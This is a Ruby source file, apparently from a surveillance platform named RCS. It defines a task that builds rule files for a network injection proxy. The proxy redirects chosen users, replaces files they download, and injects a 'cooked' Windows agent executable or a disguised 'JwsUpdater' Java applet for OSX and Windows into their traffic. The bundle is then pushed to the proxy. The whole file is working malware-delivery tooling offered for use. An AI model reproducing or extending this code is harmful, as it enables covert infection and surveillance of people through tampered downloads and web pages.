require_relative '../tasks'

module RCS
module DB

class ProxyTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    proxy = ::Proxy.find(@params['proxy_id'])
    proxy.rules.where(:enabled => true).count + 2
  end
  
  def next_entry
    proxy = ::Proxy.find(@params['proxy_id'])
    
    base = rand(10)
    progressive = 0
    redirect_user = {}
    redirect_url = []
    intercept_files = []
    vector_files = {}

    proxy.rules.where(:enabled => true).each do |rule|

      tag = proxy.redirection_tag + (base + progressive).to_s
      progressive += 1

      yield @description = "Creating rule No: #{progressive}"
      
      # use the key of the hash to avoid duplicates
      redirect_user["#{rule.ident} #{rule.ident_param}"] ||= tag

      redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"


      case rule.action
        when 'REPLACE'
          vector_files[rule.action_param_name] = RCS::DB::GridFS.to_tmp(rule[:_grid].first)
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"

        when 'INJECT-EXE'
          # generate the cooked agent
          factory = ::Item.where({_id: rule.action_param}).first
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{factory.ident} #{rule.resource}"

          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          # generate the applet
          params = {'factory' => {'_id' => rule.action_param},
                    'binary' => {'demo' => false},
                    'melt' => {'admin' => true, 'cooked' => true}
                    }
          build = Build.factory(:windows)
          build.create params
          FileUtils.cp build.path(build.outputs.first), temp_zip
          build.clean

          # extract the zip and take the applet files
          Zip::ZipFile.open(temp_zip) do |z|
            z.each do |f|
              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
              z.extract(f, f_path) unless File.exist?(f_path)
              vector_files[f.name] = f_path
            end
          end
          File.delete(temp_zip)

        when 'INJECT-HTML'
          appname = 'JwsUpdater' + progressive.to_s
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"

          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          # generate the applet
          params = {'factory' => {'_id' => rule.action_param},
                    'generate' => {'platforms' => ['osx', 'windows'],
                                   'binary' => {'demo' => false, 'admin' => false},
                                   'melt' => {'admin' => false}
                                  },
                    'melt' => {'appname' => appname}
                    }
          build = Build.factory(:applet)
          build.create params
          FileUtils.cp build.path(build.outputs.first), temp_zip
          build.clean

          # extract the zip and take the applet files
          Zip::ZipFile.open(temp_zip) do |z|
            z.each do |f|
              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
              z.extract(f, f_path) unless File.exist?(f_path)
              vector_files[f.name] = f_path
            end
          end
          File.delete(temp_zip)
      end

    end

    yield @description = "Creating binary config"

    bin_config_file = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])

    Zip::ZipOutputStream.open(bin_config_file) do |z|
      z.put_next_entry("redirect_user.txt")
      redirect_user.each_pair do |key, value|
        z.puts "#{key} #{value}"
      end

      z.put_next_entry("redirect_url.txt")
      redirect_url.each do |value|
        z.puts value
      end

      z.put_next_entry("intercept_file.txt")
      intercept_files.each do |value|
        z.puts value
      end

      vector_files.each_pair do |filename, file|
        puts "#{filename} -> #{file}"
        z.put_next_entry("vectors/" + filename)
        z.write File.open(file, 'rb') {|f| f.read}
        File.delete(file)
      end
    end

    trace :info, "Proxy config file size: " + File.size(bin_config_file).to_s

    # make sure to delete the old one first
    GridFS.delete proxy[:_grid].first unless proxy[:_grid].nil?

    # save the binary config into the grid, it will be requested by NC later
    proxy[:_grid] = [ GridFS.put(File.open(bin_config_file, 'rb+'){|f| f.read}, {filename: proxy[:_id].to_s}) ]
    proxy[:_grid_size] = File.size(bin_config_file)

    # delete the temp file
    File.delete(bin_config_file)

    proxy.configured = false
    proxy.save

    yield @description = "Creating binary config"

    Frontend.rnc_push(proxy.address)
  end
end

end # DB
end # RCS